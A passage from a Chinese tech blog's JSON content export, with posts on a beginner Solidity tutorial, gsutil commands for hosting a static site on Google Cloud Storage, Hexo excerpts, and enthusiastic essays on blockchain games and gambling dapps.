它的语法接近于Javascript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些😉： 以太坊底层是基于帐户，而非UTXO的，所以有一个特殊的Address的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个帐户）。 由于语言内嵌框架是支持支付的，所以提供了一些关键字，如payable，可以在语言层面直接支持支付，而且超级简单。 存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。 运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。 最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。 solidity官方文档 由于在本地计算机上开始使用Solidity有点复杂，因此我们将使用名为Remix的在线IDE 作为DApp程序员的第一步。 在线remix编译器 Solidity是一种智能合约高级语言，运行在Ethereum虚拟机（EVM）之上。 如果你第一次进入这个网站，你会看到有一个名为ballot.sol的虚拟合约。让我们忽略这一点，而是从头开始，在左侧导航菜单中创建一个名为HelloWorld.sol的新文件。 现在我们有一个完全空白的文件，让我们来看看Solidity的工作原理。 我们需要指定的第一件事是我们的程序应该解释为什么版本的Solidity。这是通过第一行的版本编译指示完成的： 1pragma solidity ^0.4.0; 此行意味着我们正在阻止我们的程序被一个比0.4.0更老的编译器编译 ^表示向上兼容，但是不能够被0.5.0及其以上的编译器编译。我们这样做是为了尽量减少代码以意想不到或不兼容的方式编译时可能发生的错误的风险。接下来，是时候编写实际的合同代码了！我们通过使用声明新合同的特殊关键字contract来做到这一点。如果你习惯了面向对象的语言，你会注意到它和类的定义类似。 1234pragma solidity ^0.4.0;contract HelloWorld &#123; //从这里放置合约代码&#125; 合约名字是随意指定的，为了当前的目的相契合，我们命名为HellowWorld，在合约内部，我们添加一个状态变量，用字符串来存储一串汉字，我们将变量名定义为firstTest, 1234contract HelloWorld &#123; // 放置你喜欢的字符串 string myName = \"jonson\";&#125; 请注意，Solidity是静态类型的，因此在为其分配值之前，您总是需要定义变量的类型。所有类型的列表可以在Solidity的文档中找到。 最后，我们希望能够通过调用函数从我们的合约中查询出这个值。我们将调用这个函数getIt： 1234567contract HelloWorld &#123; string firstTest = \"jonson\"; //添加函数: function getIt() returns(string) &#123; return firstTest; &#125;&#125; 请注意，我们需要在Solidity中指定函数的返回值。由于在这种情况下我们只是返回myName字符串，所以我们编写了returns (string) 解决编译器警告 如果您一直沿用这种方式并将代码放在Remix中，那么您可能已经注意到窗口右侧存在一些警告。 😢 如果勾上了右侧的自动编译,每当你改变代码中的某些东西时，Remix就会自动尝试编译它。红色字段表示代码编译失败（由于语法错误），黄色字段表示编译时有一些警告。 第一个警告告诉我们，我们函数的可见性没有被指定（因此默认为“public”）。以太坊实际上有4种可见度类型： public：任何人都可以调用该函数，包括DApp的使用者。 private：只有合约本身可以调用该函数（在另一个函数中）。 internal：只有这份合同以及由此产生的所有合同才能称之为合同。 external：只有外部可以调用该函数，而合约内部不能调用。 根据经验，public 与 private 是最常用的类型。 由于我们现在只是在测试，所以我们不介意将函数的可见性设置为public。请注意，尽管Solidity设置为public，但始终明确指定函数的可见性被认为是一种良好习惯，以避免潜在的灾难性疏忽。 1234//在函数名称后加上public修饰符 function getIt() public returns(string) &#123; return firstTest; &#125; 这样做后，只剩下一个警告。这一个很难理解： 1Warning: Function state mutability can be restricted to view 编译器真正在说的是它检测到我们的函数从不改变区块链上的任何状态变量 -而仅仅读取。因此，我们可以使用view修饰符来使其更加清晰： 1234 //在public后添加view function getIt() public view returns(string) &#123; return firstTest;&#125; 当一个函数有一个“view”修饰符时，你不需要花费任何gas来调用它们（即使它们使用了消耗气体的操作），因为不需要进行事务处理。它们基本上是“免费使用”的。 有3种内置的函数修饰符会影响花费gas的量: view: 可以自由调用，因为它只是“查看”区块链的状态而不改变它 pure: 也可以自由调用，既不读取也不写入区块链 payable:常常用于将代币发送给合约地址。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"唯识相链由来","slug":"wsxl-origin","date":"2018-11-04T03:43:34.000Z","updated":"2018-11-06T12:53:46.514Z","comments":true,"path":"2018/11/04/wsxl-origin/","link":"","permalink":"https://dreamerjonson.com/2018/11/04/wsxl-origin/","excerpt":"","text":"桃花源记 复行数十步，豁然开朗。土地平旷，屋舍俨然，有良田美池桑竹之属。阡陌交通，鸡犬相闻。其中往来种作，男女衣着，悉如外人；黄发垂髫，并怡然自乐。 陶渊明曾经描绘过桃花源这样美丽的世外桃源。 在这片信任的社会中，大家都各自和睦共处并怡然自乐。 博弈论 其实从现代博弈的观点来看，在这样一个封闭的信任社会中，一个人要想犯罪、欺骗的代价是非常高的，甚至高到他不愿意去选择欺骗。 因为一次欺骗就足以毁灭其在这个社会生存的可能。时代在前进，当前的资源是跨时间与空间的交换，交易人甚至在地球的另外一端。 如何在无信的社会（truthless）还能够建立一种共识或是信任是几十年来人类在思考的问题。国家、中心、权威或是中介一定程度上就是在为其作出努力。 但是这还远远不够，我们还希望建立一个去中心化的理想社会，每个人都是自己的主人。中本聪关于区块链的精巧设计让我们看到了未来的大门。 唯识相链 唯识其实就是唯一的共识。其阐释了区块链的哲学魅力，在这个系统中所有人链在一起，达成了都认同一个独一无二的真相，唯识便产生了。在这个系统中，欺骗的代价如此之高，甚至高到他不愿意去选择欺骗。 唯识也是佛教的一个分支，他代表人类真正的了解自己的学问。这代表我们对于人类和人类社会的思考。新的时代真正的开始了，时代不会等待任何一个人。站在时代的风口浪尖，走在人生的十字路口。是被乘着海浪起飞实现鲤鱼跳龙门、还是被淹没在时代的浪潮中，作出你的选择（make your choice）","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]},{"title":"google cloud storage托管静态页面","slug":"google-cloud-storage托管静态页面","date":"2018-11-02T16:34:21.000Z","updated":"2018-11-08T16:04:52.481Z","comments":true,"path":"2018/11/03/google-cloud-storage托管静态页面/","link":"","permalink":"https://dreamerjonson.com/2018/11/03/google-cloud-storage托管静态页面/","excerpt":"","text":"初始步骤 1、 域名 2、 google Cloud create project. the project name must match the domain name 3、cname 12NAME TYPE DATAwww.example.com CNAME c.storage.googleapis.com. Google Cloud SDK oogle Cloud SDK 是一套工具，您可以使用这套工具来管理托管在 Google Cloud Platform 上的资源和应用。其中包括 gcloud、gsutil 和 bq 命令行工具。install gsutil 工具 设置所有文件的权限可见 1gsutil acl -r ch -u AllUsers:R gs://www.dreamerjonson.com/* 删除文件： -r递归遍历所有 1gsutil rm -r gs://www.dreamerjonson.com/.git/ 上传单个文件 1gsutil cp test.js gs://www.dreamerjonson.com 上传文件夹下所有文件 1gsutil cp -r ./ gs://www.dreamerjonson.com 增量同步 -m多线程 -d 删除不匹配的文件 -r递归 1gsutil -m rsync -d -r ./ gs://www.dreamerjonson.com 设置 MainPageSuffix 和 NotFoundPage 在以下示例中，MainPageSuffix 被设置为 index.html，NotFoundPage 被设置为 404.html： 1gsutil web set -m index.html -e 404.html gs://www.example.com 更新默认上传权限 1gsutil defacl ch -u AllUsers:R gs://www.dreamerjonson.com 参考资料 google domains help storage托管静态页面 gsutil使用 gsutil快速入门 gsutil defacl","categories":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/categories/server/"}],"tags":[{"name":"server","slug":"server","permalink":"https://dreamerjonson.com/tags/server/"}]},{"title":"hexo-excerpt","slug":"hexo-excerpt","date":"2018-07-14T02:17:32.000Z","updated":"2018-12-14T02:19:02.784Z","comments":true,"path":"2018/07/14/hexo-excerpt/","link":"","permalink":"https://dreamerjonson.com/2018/07/14/hexo-excerpt/","excerpt":"","text":"hexo 博客摘要 1234567891011121314Use a html comment with the word &quot;more&quot; to mark the excerpt of your post, like this:title: post title---This part is the excerpt, get it with the &lt;%- post.excerpt %&gt;&lt;!-- more --&gt;This is the rest of the post. You can get it with &lt;%- post.more %&gt;All the text after the &lt;!-- more --&gt; is only displayed when you view the page of the post.Font: https://groups.google.com/forum/#!topic/hexo/cdbCM0lb9A0Edit: You can also use this hexo-front-matter-excerpt plugin to define the excerpt in the front matter with whatever content you want.Cheers!","categories":[{"name":"hexo","slug":"hexo","permalink":"https://dreamerjonson.com/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://dreamerjonson.com/tags/hexo/"}]},{"title":"区块链游戏的革命(下)","slug":"区块链游戏的革命-下","date":"2018-06-06T12:28:55.000Z","updated":"2018-11-06T12:53:40.049Z","comments":true,"path":"2018/06/06/区块链游戏的革命-下/","link":"","permalink":"https://dreamerjonson.com/2018/06/06/区块链游戏的革命-下/","excerpt":"","text":"Vitalik Buterin > 在2007到2010年，我痴迷于玩“魔兽世界”这款游戏，但是突然有一天，暴雪移除了我心爱术士的虹吸生命术技能所具有的的伤害。 我哭着到睡着了。从那一天起，我意识到了中心化服务器带来的可怕后果。我很快决定退出这一切... ——Vitalik Buterin 以太坊创始人 在上一篇文章中，我们介绍了区块链由于其代码的可验证性，对于赌博游戏带来了新的生机。但是区块链给游戏带来的冲击还远远不止于此。比如说？ 永远不会被关闭 当我们在玩一款游戏的时候，我们常常会担心这款游戏在几年以后突然就关闭了，自己为游戏中的所有物品、为这款游戏倾注的心血都会随此全部消失。我们也常常会担心这款游戏轻易的就会被黑客所袭击、或是服务器故障所带来的致命问题。但是！在区块链的世界中完全不用担心这些问题。由于数据存储在区块链之上，而网络中的所有节点都存储了完整的区块信息。意味着一个节点的奔溃或是欺骗不会对于系统带来冲击。蓦然回首，数据就一直在那里等着你。 稀有性 当我们在玩一款游戏的时候，我们会因为开到了一个及其稀有的卡牌或是装备而兴奋 (比如在吃鸡游戏中开到的衣服，或是炉石传说中的稀有卡牌)。但是，我们很快就发现随着时间的推移这些装备甚至会变得一文不值。但是，在一款优秀的区块链游戏中，我们能够验证到我们的装备是真正的稀有，意味着从这款游戏从出生到结束，这个装备的数量都会被验证为有限多个。玩家能够真正知道自己获得了稀有的装备。激动吧！！ 独一无二的所有权 区块链的特性之一就是异常安全，一款运行在区块链之上的游戏将会比传统游戏拥有更强的安全性。自己可以宣誓主权，证明自己对于物品独一无二的所有权。除非你自己愿意转移给其他人。 可交易 独一无二的所有权与稀有性就为游戏倾注了更多激动人心的元素，那就是可交易。在区块链之上，同一款游戏的代币甚至于不同游戏的代币之间只要满足相同的协议(如ERC721代币协议)，就能够很方便的实现交易。同时，游戏的代币也会很容易的同以太币、比特币等高价值货币进行交换。这意味着玩家投入的时间、玩家拥有的稀有物品将能够真正的变现。从而开启了游戏赚钱的时代。 分叉带来自由 当我们玩魔兽、英雄联盟的时候，我们会知道游戏的生产商常常会有巨大的版本升级、这对于一些玩家的游戏体验来说是毁灭性的，他们因此退出了这款游戏。更重要的是，我们需要相信游戏的生产商是站在玩家的立场上来考虑问题的，但是很显然，这也是一群唯利是图的人。区块链游戏所带来的变革在于，一款优秀的产品即便是游戏的设计者也不能够随意的修改游戏的属性。决定游戏走向的真正的变成了游戏的玩家和社区。如果我希望削弱剑圣这个英雄，而其他玩家不愿意这样做，那我们就分道扬镳好了，一个游戏分叉为了两个世界，在第一个世界中你有你的标准，在第二个世界中我有我的标准。区块链的分叉为我们带来了自由。 还有太多太多理由……但是我们已经有理由相信，游戏行业将会迎来的第二春。 Zombie Battleground 2017年末的迷恋猫游戏（CryptoKitties）算是区块链游戏的很好尝试，但这还远远不够。毕竟迷恋猫游戏设计逻辑简单，变化太少，页面交互还太差，代码中还留有过多的后门。 现在越来越多的公司开始盯上了区块链游戏，Loom network公司无疑走在了世界的前列。其目前设计的Zombie Battleground将会是一个大型区块链游戏很好的尝试。 Zombie Battleground是一款运行在以太坊侧链上的游戏，预计在下周发布正式版。其风格类似于炉石传说，基于五行相生相克的独特的游戏规则设计。 在当前（2018年6月17日17:37:30），这款游戏在国外最大的众筹平台上，3天之内募集的资金超过了17万美元，可见市场对其的关注程度。 走在时代的风口浪尖、区块链游戏会掀起多大的风浪，让我们拭目以待…","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]},{"title":"区块链游戏的革命(上)","slug":"区块链游戏的革命","date":"2018-06-06T10:08:34.000Z","updated":"2018-11-06T12:53:43.413Z","comments":true,"path":"2018/06/06/区块链游戏的革命/","link":"","permalink":"https://dreamerjonson.com/2018/06/06/区块链游戏的革命/","excerpt":"","text":"区块链Dapp背景 伴随着区块链2.0—以太坊的火爆，诞生了各式各样的dapp(decentralized Application)。 核心数据的存储与交互都是依靠分布式的区块链。完全区别于从前服务器—客户端的模式。 在2018年的上半年，平均每天就会有5款dapp诞生。 Dapp市场 CryptoKitties 在这一系列的dapp中，各类游戏尤其让人影响深刻。迷恋猫游戏无疑是最成功的的一款。 运行在以太坊上的迷恋猫游戏（CryptoKitties）在2017年末曾经引起了以太坊网络的堵塞，导致当时大量的交易得不到确认。从此为我们打开了区块链+游戏的大门。这款简单的游戏可是赚了上百万美元哟。联合创始人Benny Giang还是学心理学的哟，所以大家不要怕，果断入场吧！ cryptocountries 击鼓传花 迷恋猫市场 区块链+博彩游戏还会带来更加疯狂的浪潮，最近火爆的游戏cryptocountries，他是一款收藏国家卡片的游戏. 当下一个买家从你的手上购买国家的时候，你就可以获得20%的利润。而平台会赚取2%-5%的利润。 我们目睹了代表中国的卡片从最初的3 Ether在短短的1小时内就变为了200 以太币Ether，在第二天早上就变为了639Ether，按照当前的市场价值，其价值超过了百万人民币。现在的拥有者为JOCY LOVE艾玲曾这个兄弟，他还等待着割别人的韭菜。这个简单的击鼓传花的游戏让我们看到了人性疯狂的一面，再仔细看看排名前列的都是东南亚的国家，连朝鲜都排在了第五位。 Cryptocountries前4位 对比东南亚 东南亚国家的疯狂读者会有什么启示呢？是不是一个分析国家和地域文化差异很好的材料呢？ 博彩 人似乎生来就是游戏的动物，即便是最简单的筛子游戏也能牵动起人类的神经。 etherRoll 下面这个很火的etherRoll赌博游戏，你可以自己设置自己押注的以太币和赢得概率，从而在赢下游戏之后获取相应的回报。 产品清单 运行在以太坊之上的智能合约，似乎为博彩游戏提供了天然的土壤。 由于在区块链之上的代码可以被所有人验证，意味着你的赌博逻辑是公开透明的，我能明确平台到底有没有作弊，抽走了多少提成。 中心化的平台不再是一个黑箱，认为平台有猫腻的困惑完全将会被打消，为游戏行业迎来了新的变革，我们有理由相信区块链带给游戏行业的巨大变革。 但是区块链带给游戏的冲击还远远不止于此， 请关注下一篇文章。","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]}]}